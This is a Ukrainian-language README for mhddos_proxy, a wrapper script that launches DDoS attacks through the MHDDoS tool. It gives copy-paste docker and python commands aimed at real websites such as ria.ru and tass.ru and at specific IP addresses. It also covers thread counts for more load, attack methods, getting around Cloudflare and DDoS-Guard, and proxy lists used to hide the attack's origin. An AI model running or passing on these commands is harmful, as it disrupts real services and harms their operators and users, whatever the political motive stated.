Скрипт-обгортка для запуску потужного DDoS інструмента [MHDDoS](https://github.com/MHProDev/MHDDoS).

- **Не потребує VPN** - скачує і підбирає робочі проксі для атаки (доступний режим `--vpn` за бажанням)
- Атака **декількох цілей** з автоматичним балансуванням навантаження
- Використовує **різноманітні методи для атаки**

### ⏱ Останні оновлення

- **09.04.2022** Нова система проксі - тепер кожен отримує ~200 проксі для атаки з загального пулу ~6000 штук. Параметри `-p` (`--period`) та `--proxy-timeout` більше не використовуються
- **04.04.2022** Додано можливість використання власного списку проксі для атаки - [інструкція](#власні-проксі)
- **03.04.2022** Виправлена помилка Too many open files (дякую, @kobzar-darmogray та @euclid-catoptrics)

<details>
  <summary>📜 Раніше</summary>

- **02.04.2022** Робочі потоки більше не перезапускаються на кожен цикл, а використовуються повторно. Також виправлена робота Ctrl-C
- **01.04.2022** Оновленно метод CFB у відповідності з MHDDoS. [Див. примітки нижче](#-попередження-щодо-деяких-методів-атаки)
- **31.03.2022** Додано надійні DNS сервери для резолвінгу цілі, замість системних. (1.1.1.1, 8.8.8.8 etc.)
- **29.03.2022** Додано підтримку локального файлу конфігурації (дуже дякую, @kobzar-darmogray).
- **28.03.2022** Додано табличний вивід `--table` (дуже дякую, @alexneo2003).
- **27.03.2022**
    - Дозволено запуск методів DBG, BOMB (дякую @drew-kun за PR) та KILLER для відповідності оригінальному MHDDoS.
- **26.03.2022**
    - Запуск усіх обраних атак, замість випадкового вибору
    - Зменшено використання RAM на великій кількості цілей - тепер на RAM впливає тільки параметр `-t`
    - Додане кешування DNS і корректна обробка проблем з резолвінгом
- **25.03.2022** Додано режим VPN замість проксі (прапорець `--vpn`)
- **25.03.2022** MHDDoS включено до складу репозиторію для більшого контролю над розробкою і захистом від неочікуваних
  змін
</details>

### 💽 Встановлення | Installation - [інструкції ТУТ](/docs/installation.md)

### 🕹 Запуск | Running (наведено різні варіанти цілей)

#### Docker

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

#### Python (якщо не працює - просто python замість python3)

    python3 runner.py https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

### 🛠 Налаштування (більше у розділі [CLI](#cli))

**Усі параметри можна комбінувати**, можна вказувати і до і після переліку цілей

Змінити навантаження - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru

Щоб переглянути інформацію про хід атаки, додайте прапорець `--table` для таблиці, `--debug` для тексту

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru

### 🐳 Комьюніті
- [Детальний розбір MHDDoS_proxy](https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/MHDDoS_proxy.md)
- [Utility for converting shared targets into config format](https://github.com/kobzar-darmogray/mhddos_proxy_utils)
- [Аналіз засобу mhddos_proxy](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)

### 🚨 Попередження щодо деяких методів атаки
Метод **BYPASS** - це повільна версія методу GET, має сумнівну ефективність через відсутність помітної реалізації обходу захисту.

Метод **CFB** - може обійти лише незначну частину захисту деяких сайтів, повна реалізація потребує вирішення CAPTCHA,
а також доступу до платної версії бібліотеки яку не можливо буде включити до складу mhddos_proxy (через відкритий код).  
Метод **DGB** - успішні запити залежать не від самої реалізації (вона не працює), а від "чистоти" IP-адреси.  
Наразі не існує надійної open-source реалізації обходу Cloudflare та DDoS-Guard.  
Еффективнішим буде пошук оригінальних серверів цілі або атака методами за замовчуванням.

Метод **BOMB** потребує значно більше RAM - зменшіть значення `-t`.  
Також потребує додаткових налаштувань при запуску через python - звертайтеся
до [документації MHDDoS](https://github.com/MHProDev/MHDDoS).

Метод **KILLER** може мати непередбачувані наслідки для вашої системи - використання на власний ризик.

### CLI

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-c URL]
                     [--table]
                     [--debug]
                     [--vpn]
                     [--rpc RPC] 
                     [--http-methods METHOD [METHOD ...]]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -c, --config URL|path  URL or local path to file with attack targets
      -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
      --table                Print log as table
      --debug                Print log as text
      --vpn                  Disable proxies to use VPN
      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
      --proxies URL|path     URL or local path to file with proxies to use
      --http-methods GET     List of HTTP(s) attack methods to use.
                             (default is GET, POST, STRESS, BOT, PPS)
                             Refer to MHDDoS docs for available options
                             (https://github.com/MHProDev/MHDDoS)

### Власні проксі

#### Формат файлу:

    114.231.123.38:1234
    114.231.123.38:3065:username:password
    username:password@114.231.123.38:3065
    socks5://114.231.155.38:5678
    socks5://114.231.155.38:5678:username:password
    socks4://username:password@114.231.123.38:3065

#### Віддалений файл (однаково для Python та Docker)

    python3 runner.py --proxies https://pastebin.com/raw/UkFWzLOt https://ria.ru

#### Для Python

Покладіть файл поруч з `runner.py` і додайте до команди наступний прапорець (замініть `proxies.txt` на ім'я свого файлу)

    python3 runner.py --proxies proxies.txt https://ria.ru

#### Для Docker
Потрібно монтувати volume щоби Docker мав доступ до файлу.  
Обов'язково вказувати абсолютний шлях до файлу і не загубити `/` перед іменем файлу

    docker run -it --rm --pull always -v /home/user/ddos/mhddos_proxy/proxies.txt:/proxies.txt ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --proxies /proxies.txt https://ria.ru
